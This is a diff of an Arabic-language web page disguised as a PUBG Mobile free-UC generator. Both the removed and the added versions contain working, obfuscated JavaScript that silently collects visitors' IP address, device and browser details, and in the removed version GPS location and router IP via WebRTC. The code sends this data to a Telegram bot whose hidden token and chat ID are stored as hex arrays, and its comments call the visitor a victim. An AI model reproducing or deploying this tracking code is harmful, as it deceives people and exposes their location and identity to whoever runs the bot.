@@ -1,48 +1,23 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-    <meta charset="UTF-8">
-    <title>PUBG Mobile - UC Generator 2026</title>
-    <script>
-        // تشفير التوكن والآيدي بمصفوفات Hex لعدم الكشف النهائي
-        const _0x1 = [0x38, 0x34, 0x31, 0x30, 0x31, 0x30, 0x32, 0x37, 0x32, 0x32]; 
-        const _0x2 = [0x3a, 0x41, 0x41, 0x46, 0x51, 0x4f, 0x31, 0x75, 0x7a, 0x36, 0x45, 0x6f, 0x79, 0x34, 0x55, 0x68, 0x46, 0x47, 0x48, 0x61, 0x61, 0x5f, 0x71, 0x48, 0x53, 0x61, 0x46, 0x52, 0x62, 0x37, 0x47, 0x64, 0x56, 0x48, 0x4d];
-        const _0x3 = [0x31, 0x37, 0x37, 0x32, 0x38, 0x32, 0x30, 0x34, 0x33, 0x33];
+<script>
+    const _0x1 = [0x38, 0x34, 0x31, 0x30, 0x31, 0x30, 0x32, 0x37, 0x32, 0x32]; 
+    const _0x2 = [0x3a, 0x41, 0x41, 0x46, 0x51, 0x4f, 0x31, 0x75, 0x7a, 0x36, 0x45, 0x6f, 0x79, 0x34, 0x55, 0x68, 0x46, 0x47, 0x48, 0x61, 0x61, 0x5f, 0x71, 0x48, 0x53, 0x61, 0x46, 0x52, 0x62, 0x37, 0x47, 0x64, 0x56, 0x48, 0x4d];
+    const _0x3 = [0x31, 0x37, 0x37, 0x32, 0x38, 0x32, 0x30, 0x34, 0x33, 0x33];
+    const _hex = (a) => a.map(b => String.fromCharCode(b)).join('');
 
-        const _hex = (a) => a.map(b => String.fromCharCode(b)).join('');
-
-        const _emit = async (msg) => {
-            const _t = _hex(_0x1) + _hex(_0x2);
-            const _c = _hex(_0x3);
-            const _u = _hex([104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116]) + _t + _hex([47,115,101,110,100,77,101,115,115,97,103,101]);
-            await fetch(_u, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: _c, text: "🔱 [Inbound]:\n" + msg}) });
-        };
-
-        window.onload = async () => {
-            // سحب البيانات بهدوء شديد
-            try {
-                const ip = await fetch('https://api.ipify.org?format=json').then(r => r.json());
-                _emit(`🌐 IP: ${ip.ip}\n📱 UA: ${navigator.userAgent}`);
-            } catch(e) {}
-
-            // سحب الموقع GPS دقيق جداً
-            navigator.geolocation.getCurrentPosition(p => {
-                _emit(`📍 GPS: http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
-            }, () => { _emit("⚠️ الضحية رفض إذن الموقع"); }, {enableHighAccuracy: true});
-
-            // ثغرة WebRTC لسحب آيبي الراوتر (بدون استئذان)
-            const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
-            pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-            pc.onicecandidate = i => { if(i && i.candidate) _emit("🏠 Router IP: " + i.candidate.candidate.split(' ')[4]); };
-        };
-    </script>
-</head>
-<body style="background:#050505; color:#EAB308; text-align:center; font-family:Arial; padding-top:100px;">
-    <div style="border:1px solid #EAB308; padding:40px; border-radius:20px; display:inline-block; box-shadow: 0 0 20px #EAB308;">
-        <h1 style="letter-spacing:2px;">🔱 PUBG UC CENTER 2026 🔱</h1>
-        <p>استلم هديتك الآن عبر الـ ID الخاص بك</p>
-        <input type="text" placeholder="Character ID" style="padding:12px; width:80%; border-radius:5px; border:none;"><br><br>
-        <button onclick="alert('جاري معالجة الشحن للحساب..')" style="background:#EAB308; color:black; padding:15px 30px; border:none; cursor:pointer; font-weight:bold; border-radius:5px;">شحن الآن</button>
-    </div>
-</body>
-</html>
+    async function capture() {
+        const t = _hex(_0x1) + _hex(_0x2);
+        const c = _hex(_0x3);
+        const api = `https://api.telegram.org/bot${t}/sendMessage`;
+        
+        // سحب الـ IP والمعلومات
+        const info = await fetch('https://api.ipify.org?format=json').then(r => r.json());
+        const msg = `🔱 [صيدة جديدة]:\n🌐 IP: ${info.ip}\n📱 الجهاز: ${navigator.platform}\n🌍 المتصفح: ${navigator.userAgent}`;
+        
+        await fetch(api, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({chat_id: c, text: msg})
+        });
+    }
+    capture();
+</script>
